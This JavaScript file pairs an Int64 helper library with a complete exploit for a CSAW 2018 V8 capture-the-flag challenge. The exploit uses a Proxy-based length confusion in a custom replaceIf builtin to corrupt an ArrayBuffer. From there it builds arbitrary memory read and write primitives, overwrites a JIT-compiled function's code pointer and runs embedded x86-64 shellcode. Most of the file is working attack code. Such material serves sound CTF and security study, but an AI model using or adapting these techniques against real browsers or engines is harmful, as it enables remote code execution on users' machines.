//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    this.lower = function() {
        return bytes[0] + 256 * bytes[1] + 256*256*bytes[2] + 256*256*256*bytes[3];
    };

    this.upper = function() {
        return bytes[4] + 256 * bytes[5] + 256*256*bytes[6] + 256*256*256*bytes[7];
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

// exploit for csaw 2018 challenge
// v8::internal::FixedArray::set
// b v8::internal::Builtin_Impl_ArrayReplaceIf(int, v8::internal::Object**, v8::internal::Isolate*)

// set up our proxy object to fake its length
var handler = {
    get: function(obj, prop) {
    	if (prop == 'length')
        	return 0x1000;
        else
        	return obj[prop];
    }
};


// utilize the replaceIf function. this has a bug
// where it holds an internal reference to the array
// object if we use a proxy, and then only rechecks
// the length on the proxy, not the array_object itself

// readline();

var saved_arrays = []
var saved_buffers = []

var guessed_idx = 0;
while (guessed_idx < 60) {
	var arr = new Array(0x8);
	for(var y = 0; y < arr.length; y++) {
		arr[y] = 0x69;
	}
	saved_arrays.push(arr);
	var buffer = new ArrayBuffer(0x33);
	console.log(guessed_idx + " (before) : " + buffer.byteLength);
	/*for(var y = 0; y < buffer.length; y++) {
		buffer[y] = 0x41;
	}*/
	buffer[0] = guessed_idx;
	saved_buffers.push(buffer);

	// write a size pointer
	new Proxy(arr, handler).replaceIf(guessed_idx, function(elem) {
		//// %DebugPrint(elem);
		if (elem == 0x33) {
			return true;
		}
		// %DebugPrint(elem);
		/*if (typeof elem != 'number') {
			console.log(typeof elem);
			//try { console.log(elem); } catch (err) {};
			//try { console.log(Object.keys(elem)); } catch (err) {};
		}
		
		arr.length = 1;*/
		return guessed_idx > 90;
	}, 0x13370000);
	console.log(guessed_idx + "  (after) : " + buffer.byteLength);
	if (buffer.byteLength != 0x33) {
		// we hit the actual length field
		break;
	}
	guessed_idx += 1
}

console.log("landed with guessed_idx " + guessed_idx);	

// store an ArrayBuffer as the backing store of our corrupted arraybuffer
var victim = new ArrayBuffer(0x1337);
new Proxy(arr, handler).replaceIf(guessed_idx+1, function(elem) {
	return 1;
}, victim);

// this is an typedarray whose backing is the victim arraybuffer
var arrbuf_view = new Uint8Array(buffer);

// set up our arb r/w functions
function r64(addr) {
	// set the backing ptr of the victim array, but allow
	// the caller to not change the current address
	var b = addr.bytes();
	for(x = 0; x < 8; x++) {
		arrbuf_view[0x1f + x] = b[x];
	}
	

	// our view over the victim
	var victim_view = new Uint8Array(victim);
	var mybytes = [];
	for (x = 0; x < 8; x++) {
		mybytes.push(victim_view[x]);
	}

	// read from victim array
	return new Int64(mybytes);
}

function w64(addr, data) {
	// set the backing ptr of the victim array
	var b = addr.bytes();
	for(x = 0; x < 8; x++) {
		arrbuf_view[0x1f + x] = b[x];
	}

	// our view over the victim
	var victim_view = new Uint8Array(victim);
	// write over it
	b = data.bytes();
	for(x = 0; x < 8; x++) {
		victim_view[x] = b[x];
	}
}

function writen(addr, data) {
	// set the backing ptr of the victim array
	var b = addr.bytes();
	for(x = 0; x < 8; x++) {
		arrbuf_view[0x1f + x] = b[x];
	}

	// our view over the victim
	var victim_view = new Uint8Array(victim);
	// write over it
	for(x = 0; x < data.length; x++) {
		victim_view[x] = data[x];
	}
}

// create function that will be jitted
function blah(a, b) {
	return a + b;
}

var y = 0;
for(x = 0; x < 0x1000; x++) {
	y += blah(x, x+1);
}

// set a function as a property of the victim object
victim[0] = blah;

// read the value of the victim's elem ptr
var mybytes = [];
for(x = 0x0f; x < 0x17; x++) {
	mybytes.push(arrbuf_view[x]);
}
var elem_ptr = new Int64(mybytes);
console.log(elem_ptr);

// add 0xF to get base of our function object
var func_ptr = r64(Add(elem_ptr, new Int64(0xF)));
console.log(func_ptr);

// grab the jit buffer pointer off the function
var jitbuf_ptr_ptr = Add(func_ptr, new Int64(0x2F));
var jitbuf = r64(jitbuf_ptr_ptr);
console.log(jitbuf_ptr_ptr);

// offset somewhere later in the jitbuffer
jitbuf = Add(jitbuf, new Int64(0x60000));

// shellcode for execve("/bin/id", NULL, NULL);
// 48b801010101010101015048b82e63686f2e686501483104244889e731d231f66a3b580f05
var sc = [0x68, 0x2e, 0x68, 0x65, 0x1, 0x81, 0x34, 0x24, 0x1, 0x1, 0x1, 0x1, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x48, 0x89, 0xe7, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0xf, 0x5];

// write to jitbuffer
writen(jitbuf, sc);
console.log(jitbuf);

// overwrite functions jitbuf ptr
w64(jitbuf_ptr_ptr, Sub(jitbuf, new Int64(0x3F)));
// readline()

// call function
victim[0](0x13, 37);

console.log("victim");
// %DebugPrint(victim);

// %DebugPrint(buffer);

// readline();
throw "blah";